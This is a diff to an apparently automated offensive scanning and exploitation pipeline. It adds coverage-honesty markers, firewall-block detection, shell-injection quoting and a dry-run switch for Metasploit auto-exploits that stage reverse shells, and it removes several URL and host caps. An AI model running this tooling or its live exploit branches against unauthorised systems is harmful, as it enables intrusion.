@@ -179,6 +179,13 @@ TARGETS_DIR  = os.path.join(BASE_DIR, "targets")
 RECON_DIR    = os.path.join(BASE_DIR, "recon")
 FINDINGS_DIR = os.path.join(BASE_DIR, "findings")
 REPORTS_DIR  = os.path.join(BASE_DIR, "reports")
+# Set once, after the --cookie auth pre-flight, so generate_reports() can run the
+# authenticated authz/IDOR/PII audit (authz_audit) without threading the cookie through
+# the whole pipeline. Empty => unauthenticated run => the audit is skipped.
+_AUTHED_COOKIE = ""
+# --seed-urls: operator-supplied parameterized URLs forced into the sqli/param test set —
+# the fix for WebForms (__doPostBack) / SPA apps whose GET endpoints the link-crawl can't find.
+_SEED_URLS: list = []
 WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
 HOME         = os.path.expanduser("~")
 GOBIN        = os.path.join(HOME, "go", "bin")
@@ -202,6 +209,23 @@ WATCHDOG_INTERVAL  = 60
 WATCHDOG_MAX_IDLE  = 5
 WATCHDOG_DIAG_AT   = 3
 WATCHDOG_MSF_IDLE  = 10
+# Consecutive watchdog ticks of SYN_SENT-with-zero-ESTABLISHED (output also stalled)
+# before declaring the target has BLOCKED us. A WAF/firewall that null-routes the source
+# IP on a malicious-payload hit (e.g. Palo Alto threat-prevention block, typically a
+# FIXED-duration block) leaves the scanner sending SYNs that get no SYN-ACK — the retry
+# churn otherwise reads as "busy" forever, so the run banks false-negative "0 findings"
+# against an unreachable host. 3 ticks (~3 min) avoids tripping on brief slowness.
+WATCHDOG_BLOCK_TICKS = 3
+
+# Per-call sqlmap timeouts already bound total runtime, so these caps exist only
+# to keep a single phase from ballooning. When a cap actually drops candidates we
+# emit a degradation marker so the report reflects partial coverage rather than
+# silently over-reporting. (audit-fix findings 1/2)
+SQLMAP_GET_MAX     = 20    # top GET candidates (db-named hosts prepended first)
+# POST: 0 = iterate ALL discovered endpoints (per-call timeout bounds runtime).
+SQLMAP_POST_MAX    = 0
+# CORS: 0 = test ALL live URLs (env override CORS_MAX_URLS). (audit-fix finding 6)
+CORS_MAX_URLS      = int(os.environ.get("CORS_MAX_URLS", "0") or "0")
 
 # Colours
 GREEN   = "\033[0;32m"
@@ -342,6 +366,16 @@ class ProcessWatchdog:
         effective_path: str = "",
     ):
         self.proc        = proc
+        # audit-fix (finding 4): pin the child's process-group id at construction.
+        # Children are launched via setsid (run_cmd / _fork_safe_spawn), so the
+        # child pid == its pgid. Pinning it now means _kill_proc never re-derives
+        # the pgid from a pid that a concurrent reap may have recycled to an
+        # unrelated process — closing the PID-reuse TOCTOU that could killpg a
+        # bystander group. Falls back to proc.pid (its own pgid under setsid).
+        try:
+            self._orig_pgid = os.getpgid(proc.pid)
+        except Exception:
+            self._orig_pgid = proc.pid
         self.watch_file  = watch_file
         self.phase       = phase
         self.interval    = interval
@@ -356,8 +390,12 @@ class ProcessWatchdog:
         self._last_cpu_times: dict = {}
         self._last_socket_signature = ""
         self._last_socket_summary = "(not sampled yet)"
+        self._last_syn_sent = 0          # block-detection: SYN_SENT count last tick
+        self._last_established = 0        # block-detection: ESTABLISHED count last tick
+        self._block_count = 0             # consecutive ticks of SYN_SENT-with-no-ESTABLISHED
         self.diag_at    = diag_at   # stale_count at which brain diagnoses (default 3 min)
         self.killed     = False
+        self.blocked    = False     # set True if the target null-routed us (WAF/firewall IP-block)
         self._stop_evt  = threading.Event()
         self._thread    = threading.Thread(target=self._run, daemon=True,
                                            name=f"watchdog-{phase}")
@@ -508,6 +546,7 @@ class ProcessWatchdog:
 
         entries = []
         counts = {}
+        nl_counts = {}   # non-loopback only — used for TARGET-BLOCK detection
         active = False
         for idx, line in enumerate(lsof_out.splitlines()):
             if idx == 0 or not line.strip():
@@ -520,10 +559,24 @@ class ProcessWatchdog:
                 entries.append(line.strip())
                 if state in ("ESTABLISHED", "SYN_SENT", "SYN_RECV"):
                     active = True
+                # Block-detection counts EXCLUDE loopback/control sockets (the Ollama brain,
+                # local proxies, interactsh/OOB helpers): a localhost ESTABLISHED must not
+                # MASK a real target block, and loopback churn must not fake target activity.
+                _addr = next((p for p in line.split() if "->" in p), "")
+                _remote = _addr.split("->", 1)[1].lower() if _addr else ""
+                _loopback = ("127.", "[::1]", "::1", "localhost", "[fe80", "fe80",
+                             "[::ffff:127.", "::ffff:127.")   # incl. IPv4-mapped localhost
+                if _remote and not _remote.startswith(_loopback):
+                    nl_counts[state] = nl_counts.get(state, 0) + 1
 
         signature = "\n".join(entries)
         changed = bool(signature) and signature != self._last_socket_signature
         self._last_socket_signature = signature
+
+        # Block-detection signals (NON-LOOPBACK only): a healthy scan ESTABLISHES
+        # connections to the target; a null-route leaves only SYN_SENT (no SYN-ACK).
+        self._last_syn_sent = nl_counts.get("SYN_SENT", 0)
+        self._last_established = nl_counts.get("ESTABLISHED", 0)
 
         if counts:
             summary = ", ".join(f"{state}={counts[state]}" for state in sorted(counts))
@@ -607,10 +660,21 @@ class ProcessWatchdog:
         return busy, proc_changed, summary, cpu_advanced, socket_active, socket_changed, socket_summary
 
     def _kill_proc(self) -> None:
-        """Kill the entire process group so all shell children die too."""
+        """Kill the entire process group so all shell children die too.
+
+        audit-fix (finding 4): poll() FIRST. ``Popen.poll()`` is authoritative
+        and reaps the child under its own lock; once it returns non-None the pid
+        (and its setsid pgid) may be recycled by the OS, so deriving/killing a
+        pgid afterwards races a bystander. If the process already exited we mark
+        killed and return without signalling anything. Otherwise we killpg the
+        pgid PINNED at construction (never re-derived from a possibly-recycled
+        pid).
+        """
+        if self.proc.poll() is not None:
+            self.killed = True
+            return
         try:
-            pgid = os.getpgid(self.proc.pid)
-            os.killpg(pgid, signal.SIGKILL)
+            os.killpg(self._orig_pgid, signal.SIGKILL)
         except Exception:
             try:
                 self.proc.kill()
@@ -688,6 +752,41 @@ class ProcessWatchdog:
                     flush=True,
                 )
 
+            # ── Target-block detection ──────────────────────────────────────────
+            # Sustained SYN_SENT with ZERO ESTABLISHED (output also stalled) means the
+            # target stopped answering our SYNs — a WAF/firewall IP-block (e.g. Palo Alto
+            # threat-prevention null-routes the source IP for a FIXED window when it sees a
+            # malicious payload). The retry churn reads as "busy" to the heuristics above, so
+            # without this the run grinds for hours and banks a FALSE-NEGATIVE "0 findings"
+            # against an unreachable host. Abort the phase and mark coverage UNRELIABLE.
+            if (not grew) and self._last_syn_sent > 0 and self._last_established == 0:
+                self._block_count += 1
+            else:
+                self._block_count = 0
+            if self._block_count >= WATCHDOG_BLOCK_TICKS:
+                if self._stop_evt.is_set() or self.proc.poll() is not None:
+                    break
+                blocked_secs = self._block_count * self.interval
+                print(
+                    f"\033[0;31m\033[1m[Watchdog/{self.phase}] TARGET BLOCKED — "
+                    f"{self._last_syn_sent} SYN_SENT / 0 ESTABLISHED for ~{blocked_secs}s "
+                    f"(WAF/firewall null-route, e.g. Palo Alto fixed-time block). Aborting "
+                    f"phase; remaining coverage is UNRELIABLE — a blocked host returns "
+                    f"false-negative 0-findings, NOT a clean target.\033[0m",
+                    flush=True,
+                )
+                _mark_degraded(
+                    self.phase,
+                    f"TARGET BLOCKED US — {self._last_syn_sent} SYN_SENT with 0 ESTABLISHED for "
+                    f"~{blocked_secs}s (firewall/WAF IP-block, likely a fixed-duration threat-"
+                    f"prevention null-route triggered by a payload). This phase and any later "
+                    f"phases are UNRELIABLE; re-run after the block window at a slower / non-"
+                    f"destructive rate. Do NOT read '0 findings' here as a clean target.")
+                self._kill_proc()
+                self.killed = True
+                self.blocked = True
+                break
+
             # Early-warning diagnosis only when the process looks truly idle.
             if stale_count == self.diag_at and _brain and _brain.enabled:
                 diag_secs = stale_count * self.interval
@@ -727,6 +826,12 @@ class ProcessWatchdog:
                                 break
                         
                         if assessment == "stuck":
+                            # audit-fix (finding 4): the brain diagnose call above can
+                            # block for minutes; re-check liveness/stop before killing so
+                            # we don't SIGKILL a process that finished (and whose pgid the
+                            # OS may have recycled) during that window.
+                            if self._stop_evt.is_set() or self.proc.poll() is not None:
+                                break
                             print(
                                 f"\033[0;31m\033[1m[Watchdog/{self.phase}] Brain assessment: STUCK or MISCONFIGURED. "
                                 f"Triggering early SIGKILL to prevent resource exhaustion...\033[0m",
@@ -752,6 +857,12 @@ class ProcessWatchdog:
                     )
 
             if stale_count >= self.max_stale:
+                # audit-fix (finding 4): re-check liveness/stop just before killing.
+                # The brain diagnose/kill notification below may block; if the
+                # process exited or stop was signalled in the meantime, bail out
+                # without killpg-ing a possibly-recycled pgid.
+                if self._stop_evt.is_set() or self.proc.poll() is not None:
+                    break
                 stale_secs = stale_count * self.interval
                 print(
                     f"\033[0;31m\033[1m[Watchdog/{self.phase}] STUCK "
@@ -1255,6 +1366,10 @@ def run_cmd(
             except subprocess.TimeoutExpired:
                 timed_out = True
                 log("warn", f"{label}: timeout after {timeout}s — killing PID {proc.pid}")
+                # Coverage-honesty (audit-fix): record the truncation so a
+                # timed-out phase isn't rendered as full coverage.
+                _mark_degraded(watch_phase or "subprocess",
+                               f"wall-clock timeout after {timeout}s — partial coverage")
                 try:
                     os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                 except Exception:
@@ -1266,6 +1381,14 @@ def run_cmd(
                 stdout = b"".join(chunks).decode("utf-8", "replace")
             finally:
                 watchdog.stop()
+                # Surface a watchdog SIGKILL (stuck/no-progress) as degraded —
+                # .killed was previously write-only.
+                if (not timed_out and getattr(watchdog, "killed", False)
+                        and not getattr(watchdog, "blocked", False)):
+                    # (a block-kill already recorded a distinct "TARGET BLOCKED" degradation;
+                    # don't double-mark it as a generic stuck/no-progress kill.)
+                    _mark_degraded(watch_phase or "subprocess",
+                                   "watchdog SIGKILL (stuck/no progress) — partial coverage")
 
             finished_at = datetime.now()
             duration = (finished_at - started_at).total_seconds()
@@ -1280,6 +1403,11 @@ def run_cmd(
         try:
             stdout, _ = proc.communicate(timeout=timeout)
         except subprocess.TimeoutExpired:
+            # Coverage-honesty (audit-fix): record the truncation. This path has
+            # no watch_phase, so attribute it to the phase named by watch_phase
+            # if set, else a generic "subprocess" marker.
+            _mark_degraded(watch_phase or "subprocess",
+                           f"wall-clock timeout after {timeout}s — partial coverage")
             try:
                 os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
             except Exception:
@@ -1358,6 +1486,12 @@ def run_live(cmd: str, timeout: int = 3600,
         except subprocess.TimeoutExpired:
             timed_out = True
             log("warn", f"{label}: timeout after {timeout}s — killing PID {proc.pid}")
+            # Coverage-honesty (audit-fix): a wall-clock timeout means the phase
+            # was truncated (partial coverage), not a clean run. Record it so the
+            # reporter doesn't render a SIGKILLed/timed-out phase as full coverage.
+            _mark_degraded(phase if watch_file is not None else (watch_phase or "subprocess"),
+                           f"wall-clock timeout after {timeout}s — partial coverage")
+            _mark_truncated_recon(watch_file, watch_phase)
             try:
                 os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
             except Exception:
@@ -1369,6 +1503,16 @@ def run_live(cmd: str, timeout: int = 3600,
         finally:
             if watchdog:
                 watchdog.stop()
+                # The watchdog SIGKILLs a stuck/no-progress child and sets
+                # .killed; that flag was previously write-only. Surface it as a
+                # degradation so a watchdog-truncated phase isn't silently clean.
+                if (not timed_out and getattr(watchdog, "killed", False)
+                        and not getattr(watchdog, "blocked", False)):
+                    # (a block-kill already recorded a distinct "TARGET BLOCKED" degradation;
+                    # don't double-mark it as a generic stuck/no-progress kill.)
+                    _mark_degraded(watch_phase or "subprocess",
+                                   "watchdog SIGKILL (stuck/no progress) — partial coverage")
+                    _mark_truncated_recon(watch_file, watch_phase)
 
         finished_at = datetime.now()
         duration = (finished_at - started_at).total_seconds()
@@ -1449,6 +1593,32 @@ def _install_lightpanda() -> bool:
         return False
 
 
+_LP_HEADER_OK: bool | None = None
+
+
+def _lightpanda_supports_header() -> bool:
+    """Cached probe: does this lightpanda build's ``fetch`` accept ``--header``?
+
+    Some builds reject it ('unknown argument arg=--header'), which silently broke
+    authenticated POST-parameter discovery (the fetch errored → 0 forms found). When it is
+    unsupported we fall back to the cookie-capable HTTP path instead of passing a flag the
+    binary rejects (which fetched 0 forms / an unauthenticated page).
+    """
+    global _LP_HEADER_OK
+    if _LP_HEADER_OK is not None:
+        return _LP_HEADER_OK
+    lp = _lightpanda_bin()
+    if not lp:
+        _LP_HEADER_OK = False
+        return False
+    try:
+        res = run_capture([lp, "fetch", "--help"], shell=False, merge_stderr=True, timeout=10)
+        _LP_HEADER_OK = "--header" in (res.get("stdout", "") or "")
+    except Exception:
+        _LP_HEADER_OK = False
+    return _LP_HEADER_OK
+
+
 def _lightpanda_fetch_forms(url: str, cookies: str = "",
                              headers: dict | None = None,
                              timeout: int = 20) -> list[dict]:
@@ -1485,11 +1655,13 @@ def _lightpanda_fetch_forms(url: str, cookies: str = "",
                 self._cur = None
 
     lp = _lightpanda_bin()
+    # When cookies/headers are required for an AUTHENTICATED fetch but this lightpanda build
+    # rejects --header, use the cookie-capable HTTP fallback instead of a flag it errors on.
+    if lp and (cookies or headers) and not _lightpanda_supports_header():
+        lp = None
     html_content = ""
 
     if lp:
-        # Build env for cookies/headers
-        env_extra: dict = {}
         cmd_parts = [lp, "fetch", "--log_level", "warn"]
         if cookies:
             cmd_parts += ["--header", f"Cookie: {cookies}"]
@@ -1745,6 +1917,24 @@ def _mark_degraded(tool: str, reason: str) -> None:
     if entry not in _DEGRADED_CAPABILITIES:
         _DEGRADED_CAPABILITIES.append(entry)
         log("warn", f"Degraded capability: {tool} — {reason}")
+
+
+def _mark_truncated_recon(watch_file: str | None, watch_phase: str | None) -> None:
+    """Drop a ``.recon_truncated`` sentinel when a RECON subprocess is killed by
+    the watchdog / wall-clock timeout, so ``_collect_completed_steps`` re-runs the
+    truncated recon on resume instead of treating partial httpx output as complete.
+
+    No-op for non-recon phases. ``watch_file`` for the recon phase is the recon
+    directory itself (see run_recon's run_live call)."""
+    try:
+        if not watch_phase or "recon" not in watch_phase.lower():
+            return
+        if not watch_file or not os.path.isdir(watch_file):
+            return
+        with open(os.path.join(watch_file, ".recon_truncated"), "w") as fh:
+            fh.write("recon truncated by watchdog/timeout — re-run on resume\n")
+    except OSError:
+        pass
 
 
 def _reset_degraded() -> None:
@@ -2994,7 +3184,13 @@ def _collect_completed_steps(domain: str, session_id: str | None = None) -> set[
     findings_dir = _resolve_findings_dir(domain, session_id=session_id)
     completed = set()
 
-    if _file_nonempty(os.path.join(recon_dir, "live", "httpx_full.txt")):
+    # audit-fix: live/httpx_full.txt is written incrementally during recon, so a
+    # recon that was SIGKILLed by the watchdog / hit the wall-clock timeout would
+    # otherwise be treated as fully completed and never re-run on resume. The
+    # subprocess timeout path drops a .recon_truncated marker in the recon dir;
+    # gate the completion on its absence so a truncated recon is re-run.
+    if (_file_nonempty(os.path.join(recon_dir, "live", "httpx_full.txt"))
+            and not os.path.exists(os.path.join(recon_dir, ".recon_truncated"))):
         completed.add("recon")
     if any(_file_nonempty(os.path.join(recon_dir, "js", name)) for name in (
         "endpoints.txt", "js_urls.txt", "jsluice_endpoints.txt",
@@ -3461,7 +3657,7 @@ def run_autonomous_hunt(
     skip_items: set[str] | None = None,
     time_left_hours: float = 2.0,
     scope_lock: bool = False,
-    max_urls: int = 100,
+    max_urls: int = 0,
 ) -> dict:
     skip_items = skip_items or set()
     if resume:
@@ -3561,9 +3757,18 @@ def run_autonomous_hunt(
     executed_steps: list[str] = []
     plan: list[dict] = []
     signals: dict = {}
+    # audit-fix (finding 6): a step that returns falsy lands in `attempted` but
+    # not `completed`; the old `planning_completed = completed | attempted`
+    # excluded it from every later plan, so a single transient blip permanently
+    # zeroed that step's coverage with no marker. Track per-step failure counts
+    # and only exclude a step once it has exhausted MAX_STEP_RETRIES; emit a
+    # degraded marker when it does, so the loss is visible in coverage.json.
+    MAX_STEP_RETRIES = 2
+    failed_counts: dict[str, int] = {}
 
     for _ in range(max(1, max_steps)):
-        planning_completed = completed | attempted
+        _retry_exhausted = {s for s, n in failed_counts.items() if n >= MAX_STEP_RETRIES}
+        planning_completed = completed | _retry_exhausted
         signals, plan = _build_autonomous_plan(
             domain,
             quick=quick,
@@ -3611,17 +3816,36 @@ def run_autonomous_hunt(
         danger = " [destructive]" if next_item.get("destructive") else ""
         log("phase", f"AUTONOMOUS STEP: {step}{danger}")
         log("info", f"Reason: {next_item['reason']}")
-        _run_autonomous_step(
-            domain,
-            step,
-            quick=quick,
-            full=full,
-            batch_size=batch_size,
-            skip_items=skip_items,
-            result=result,
-            completed=completed,
-        )
-        _update_target_state_from_artifacts(domain, session_id=session_id)
+        # audit-fix (finding 7): one raising step must NOT abort the whole plan
+        # and skip report generation. Guard the call so a crashing tool degrades
+        # to a skipped step; the loop continues and the report is still reached.
+        try:
+            _step_ok = _run_autonomous_step(
+                domain,
+                step,
+                quick=quick,
+                full=full,
+                batch_size=batch_size,
+                skip_items=skip_items,
+                result=result,
+                completed=completed,
+            )
+        except Exception as exc:  # noqa: BLE001 — one tool crash must not abort the plan/report
+            log("err", f"Autonomous step '{step}' raised and was skipped: {exc}")
+            result[step] = False
+            result["success"] = False
+            _step_ok = False
+        # audit-fix (finding 6): count failures and, once a step exhausts its
+        # retries without completing, surface the wholesale coverage loss.
+        if not _step_ok and step not in completed:
+            failed_counts[step] = failed_counts.get(step, 0) + 1
+            if failed_counts[step] >= MAX_STEP_RETRIES:
+                _mark_degraded(step, f"autonomous step '{step}' failed "
+                                     f"{failed_counts[step]}x; coverage incomplete")
+        try:
+            _update_target_state_from_artifacts(domain, session_id=session_id)
+        except Exception as exc:  # noqa: BLE001 — artifact propagation must not abort the loop
+            log("warn", f"Artifact-state propagation for '{step}' failed: {exc}")
         if resume:
             session["completed_steps"] = sorted(completed | _collect_completed_steps(domain, session_id=session_id))
         else:
@@ -3790,7 +4014,7 @@ def run_recon(
     resume: bool = False,
     session_id: str | None = None,
     scope_lock: bool = False,
-    max_urls: int = 100,
+    max_urls: int = 0,
     targets_file: str | None = None,
 ) -> bool:
     if resume:
@@ -3837,8 +4061,20 @@ def run_recon(
         scope_lock = True  # IPs/CIDRs never need subdomain enum
         log("info", f"Target type: {_target_type.upper()} — subdomain enum skipped")
         if _target_type == "cidr":
-            _hosts = expand_cidr(domain)
-            log("info", f"CIDR {domain} → {len(_hosts)} host(s) to scan")
+            # recon.sh receives the RAW CIDR string (below) and enumerates the
+            # full range, so the log must report the TRUE host count — not the
+            # 254-cap of expand_cidr(), which would badly understate a /23 or
+            # /16. (expand_cidr's cap only bites a hypothetical future caller
+            # that scopes work off its return value.)
+            try:
+                _net = ipaddress.ip_network(domain, strict=False)
+                if _net.version == 4 and _net.prefixlen < 31:
+                    _total = _net.num_addresses - 2
+                else:
+                    _total = _net.num_addresses
+            except ValueError:
+                _total = len(expand_cidr(domain))
+            log("info", f"CIDR {domain} → {_total} host(s) to scan")
 
     # Always PIN TARGETS_FILE for the child process: empty when unused, so an
     # INHERITED TARGETS_FILE env var can't hijack the normal --target / IP / CIDR
@@ -3862,6 +4098,15 @@ def run_recon(
         log("info", f"Scope-lock ON — subdomain enum skipped, testing {domain} only")
     if max_urls > 0:
         log("info", f"URL cap: {max_urls} URLs max (priority-ordered)")
+    # Clear any stale .recon_truncated sentinel from a PRIOR truncated run before
+    # this fresh recon run. Otherwise it is sticky (only ever written, never
+    # removed) and forces recon to re-run on every resume even after a clean
+    # completion — _collect_completed_steps gates recon-complete on its absence.
+    # If THIS run truncates again, the watchdog re-writes it.
+    try:
+        os.remove(os.path.join(recon_dir, ".recon_truncated"))
+    except OSError:
+        pass
     ok = run_live(
         f'{adaptive_env}{_scope_env}{_type_env}{_maxurl_env}{_targets_env}'
         f'RECON_OUT_DIR="{recon_dir}" RECON_SESSION_ID="{active_session_id or ""}" '
@@ -4290,7 +4535,7 @@ def run_js_analysis(domain: str) -> bool:
             # Record a url->file manifest alongside the content-hash-named downloads so a
             # finding (e.g. a verified key in a bundle) can carry its exact public URL without
             # a live re-fetch. (Filename is md5(url+"\n").js — the trailing newline is echo's.)
-            f'cat "{js_urls_file}" | head -50 | while IFS= read -r url; do '
+            f'cat "{js_urls_file}" | while IFS= read -r url; do '
             f'  name=$(echo "$url" | md5sum | cut -d" " -f1).js; '
             f'  curl -sk --connect-timeout 5 --max-time 20 "$url" -o "{dl_dir}/$name" 2>/dev/null; '
             f'  printf "%s\\t%s\\n" "$name" "$url" >> "{dl_dir}/manifest.tsv"; '
@@ -4299,6 +4544,19 @@ def run_js_analysis(domain: str) -> bool:
             watch_file=dl_dir,
             watch_phase="JS ANALYSIS"
         )
+        # audit-fix (finding 3): the old ``head -50`` capped trufflehog to the
+        # first 50 JS bundles in file order — silently skipping the rest of the
+        # attack surface. The per-curl ``--max-time 20`` + run_cmd ``timeout=300``
+        # already bound runtime, so the cap is gone. If the loop was nonetheless
+        # cut short by the wall-clock timeout, surface partial coverage rather
+        # than over-reporting.
+        try:
+            _downloaded = sum(1 for n in os.listdir(dl_dir) if n.endswith(".js"))
+        except OSError:
+            _downloaded = 0
+        if js_count and _downloaded < js_count:
+            _mark_degraded("trufflehog",
+                           f"JS download bounded by timeout: scanned {_downloaded} of {js_count} bundles")
         ok, output = run_cmd(
             f'{trufflehog} filesystem "{dl_dir}" --json --no-update 2>/dev/null | tee "{tf_out}"',
             timeout=SECRET_TIMEOUT,
@@ -4470,14 +4728,25 @@ def run_param_discovery(domain: str) -> bool:
     # scales linearly with wordlist size and --stable triples runtime.
     if _which("arjun"):
         top_urls_file = os.path.join(param_dir, "top_urls.txt")
-        ARJUN_MAX_URLS = 5
-        arjun_inputs = _collect_urls_from_file(live_file, limit=ARJUN_MAX_URLS)
-        if len(arjun_inputs) < ARJUN_MAX_URLS:
-            for url in _collect_urls_from_file(with_params_file, strip_query=True, limit=ARJUN_MAX_URLS * 2):
+        # Env-overridable cap (parity with CORS_MAX_URLS). Default 5 mitigates
+        # the observed rc=-9 timeouts at 905s against the 25k wordlist; set
+        # ARJUN_MAX_URLS=0 for unlimited.
+        ARJUN_MAX_URLS = int(os.environ.get("ARJUN_MAX_URLS", "5"))
+        # Count the full live-URL surface BEFORE capping so we can surface the
+        # coverage loss via _mark_degraded (matching the CORS/sqlmap pattern).
+        _arjun_all_live = _collect_urls_from_file(live_file)
+        _arjun_limit = ARJUN_MAX_URLS if ARJUN_MAX_URLS > 0 else None
+        arjun_inputs = _collect_urls_from_file(live_file, limit=_arjun_limit)
+        if ARJUN_MAX_URLS <= 0 or len(arjun_inputs) < ARJUN_MAX_URLS:
+            _topup_limit = (ARJUN_MAX_URLS * 2) if ARJUN_MAX_URLS > 0 else None
+            for url in _collect_urls_from_file(with_params_file, strip_query=True, limit=_topup_limit):
                 if url not in arjun_inputs:
                     arjun_inputs.append(url)
-                if len(arjun_inputs) >= ARJUN_MAX_URLS:
+                if ARJUN_MAX_URLS > 0 and len(arjun_inputs) >= ARJUN_MAX_URLS:
                     break
+        if ARJUN_MAX_URLS > 0 and len(_arjun_all_live) > ARJUN_MAX_URLS:
+            _mark_degraded("arjun", f"URL surface capped: probed {ARJUN_MAX_URLS} of "
+                                    f"{len(_arjun_all_live)} live URLs (set ARJUN_MAX_URLS=0 for unlimited)")
 
         if arjun_inputs:
             with open(top_urls_file, "w") as fh:
@@ -4669,9 +4938,15 @@ def run_cors_check(domain: str) -> bool:
 
     cors_out = os.path.join(cors_dir, "cors_findings.txt")
     # Test each live URL for CORS misconfig
+    # audit-fix (finding 6): the old ``[:100]`` slice silently dropped every live
+    # URL past the first 100 with no coverage marker. CORS_MAX_URLS (env
+    # CORS_MAX_URLS, default 0 = unlimited) replaces it; when a positive cap drops
+    # URLs we record a degradation below so the report shows partial coverage.
     cors_script = f"""
 import subprocess, sys, urllib.request
-urls = open("{live_file}").read().splitlines()[:100]
+_all_urls = open("{live_file}").read().splitlines()
+_cap = {CORS_MAX_URLS}
+urls = _all_urls[:_cap] if _cap > 0 else _all_urls
 findings = []
 target_domain = "{domain}"
 origins = [
@@ -4742,10 +5017,20 @@ print(f"[CORS] {{len(findings)}} findings saved to {cors_out}")
             log("info", f"CORS: {info_count} wildcard (no-creds) endpoint(s) [informational] → {cors_out}")
         else:
             log("ok", "CORS: No misconfigurations found")
+    # audit-fix (finding 6): if a positive CORS_MAX_URLS capped the surface,
+    # surface the skipped count rather than passing the phase silently.
+    try:
+        _cors_total = sum(1 for _l in open(live_file) if _l.strip())
+    except OSError:
+        _cors_total = 0
+    _cors_skipped = 0
+    if CORS_MAX_URLS > 0 and _cors_total > CORS_MAX_URLS:
+        _cors_skipped = _cors_total - CORS_MAX_URLS
+        _mark_degraded("cors", f"URL surface capped: tested {CORS_MAX_URLS} of {_cors_total}")
     _brain_phase_complete(
         "CORS CHECK",
         ok,
-        detail=f"target={domain}",
+        detail=f"target={domain} live_urls={_cors_total} cors_skipped={_cors_skipped}",
         artifacts={"cors": cors_dir},
     )
     return True
@@ -4887,6 +5172,16 @@ def run_msf(rc_path: str, label: str = "", timeout: int = 360) -> bool:
         log("warn", "msfconsole not installed — skipping auto-exploit")
         return False
 
+    # audit-fix: confirmed-RCE branches auto-launch a live `exploit` (meterpreter
+    # reverse_tcp staging) behind only the --rce-scan/--exploit phase flag. Honor
+    # MSF_DRYRUN=1 so an operator can generate/inspect the .rc files without
+    # firing the live exploit. Applies to all run_msf call sites (Tomcat, JBoss,
+    # Drupal, WordPress).
+    if os.environ.get("MSF_DRYRUN", "").strip().lower() in ("1", "true", "yes"):
+        log("warn", f"MSF_DRYRUN set — wrote .rc for '{label or 'msf'}' but NOT "
+                    f"running exploit (meterpreter staging skipped)")
+        return False
+
     lhost   = _get_lhost()
     auto_rc = rc_path.replace(".rc", "_auto.rc")
     log_path = rc_path.replace(".rc", "_output.txt")
@@ -4995,13 +5290,23 @@ def run_cms_exploit(domain: str) -> bool:
         targets = []
         if os.path.isfile(live_urls):
             with open(live_urls, errors="ignore") as fh:
+                # No [:50] cap: live/urls.txt holds one URL per live host, so a
+                # cap would silently drop hosts 51+ from fingerprinting with no
+                # marker. The per-URL 70s timeout already bounds total runtime.
                 targets = [u.strip() for u in fh
-                           if u.strip().startswith(("http://", "https://"))][:50]
+                           if u.strip().startswith(("http://", "https://"))]
         for url in targets:
+            # Shell-injection hardening (audit-fix): `url` is sourced from
+            # gau/wayback/katana archives (recon.sh) and is attacker-
+            # influenceable. Double-quoting does NOT neutralise $(...)/backticks
+            # — the shell still expands command substitution inside "...". The
+            # value is pre-substituted into shell SOURCE here, so shlex.quote it
+            # (the jsluice/secretfinder loops are safe because they read the URL
+            # via shell `read` into "$url", which is never re-parsed).
             run_cmd(
                 f'{whatweb_bin} -a1 --color=never --follow-redirect=always '
                 f'--max-redirects=3 --open-timeout=25 --read-timeout=25 '
-                f'"{url}" >> "{whatweb_out}" 2>> "{whatweb_err}"',
+                f'{shlex.quote(url)} >> {shlex.quote(whatweb_out)} 2>> {shlex.quote(whatweb_err)}',
                 timeout=70,
                 watch_file=exploit_dir,
                 watch_phase="CMS EXPLOIT"
@@ -5141,6 +5446,13 @@ def run_cms_exploit(domain: str) -> bool:
 
     if drupal_hosts:
         log("crit", f"Drupal detected on {len(drupal_hosts)} host(s): {drupal_hosts}")
+        # audit-fix (finding 7): the nuclei/drupalgeddon2 loops below cap at the
+        # first 5 hosts. Surface the true total + a degradation so coverage isn't
+        # silently under-reported when more than 5 Drupal hosts are in scope.
+        if len(drupal_hosts) > 5:
+            log("warn", f"Drupal exploit caps: testing first 5 of {len(drupal_hosts)} host(s) "
+                        f"({len(drupal_hosts) - 5} not exploited)")
+            _mark_degraded("drupal", f"CMS exploit capped: tested 5 of {len(drupal_hosts)} hosts")
 
         # ── Step 3a: nuclei Drupal templates (replaces droopescan; works on Python 3.14) ──
         nuclei_bin = _tool_bin("nuclei")
@@ -5297,6 +5609,13 @@ check
     #     or `routes` key), OR
     #   • whatweb fingerprint already in the per-host tech_matches AND a 200
     #     on a wp-* path.
+    # audit-fix (finding 7): the ``[:5]`` cap dropped WordPress candidate hosts
+    # before they were even body-confirmed — log the true total and mark the
+    # dropped hosts so coverage isn't silently under-reported.
+    if len(wp_hosts) > 5:
+        log("warn", f"WordPress fingerprint on {len(wp_hosts)} host(s) — confirming first 5 "
+                    f"({len(wp_hosts) - 5} not probed)")
+        _mark_degraded("wordpress", f"confirm capped: probed 5 of {len(wp_hosts)} fingerprinted hosts")
     confirmed_wp_hosts = []
     for host in wp_hosts[:5]:
         confirmed = False
@@ -5327,7 +5646,10 @@ check
 
     if wp_hosts:
         log("crit", f"WordPress confirmed on {len(wp_hosts)} host(s)")
-        for host in wp_hosts[:5]:
+        # audit-fix (finding 7): iterate ALL confirmed hosts (the confirmation
+        # stage above already bounds this list) — the redundant ``[:5]`` here was
+        # a second silent cap that would bite if the confirm cap is ever raised.
+        for host in wp_hosts:
             safe = host.replace("://", "_").replace("/", "_").replace(":", "_")
             wp_out = os.path.join(exploit_dir, f"wordpress_{safe}.txt")
             results = [f"# WordPress recon — {host}\n"]
@@ -5476,10 +5798,15 @@ def run_rce_scan(domain: str) -> bool:
     nuclei_rce_out = os.path.join(rce_dir, "nuclei_rce.txt")
     if _which(nuclei_bin):
         targets_file = os.path.join(rce_dir, "java_targets.txt")
+        # audit-fix (finding 8): write ALL java targets to the nuclei input file.
+        # nuclei's own concurrency + run_cmd timeout bound runtime, so the old
+        # ``[:30]`` only dropped hosts from the file while the log claimed the
+        # capped count — under-scanning while over-reporting. Now the file and
+        # the log both reflect the true total.
         with open(targets_file, "w") as f:
-            f.write("\n".join(java_targets[:30]) + "\n")
+            f.write("\n".join(java_targets) + "\n")
 
-        log("info", f"nuclei: CVE templates (tomcat, jboss, log4shell, rce) on {len(java_targets[:30])} hosts")
+        log("info", f"nuclei: CVE templates (tomcat, jboss, log4shell, rce) on {len(java_targets)} hosts")
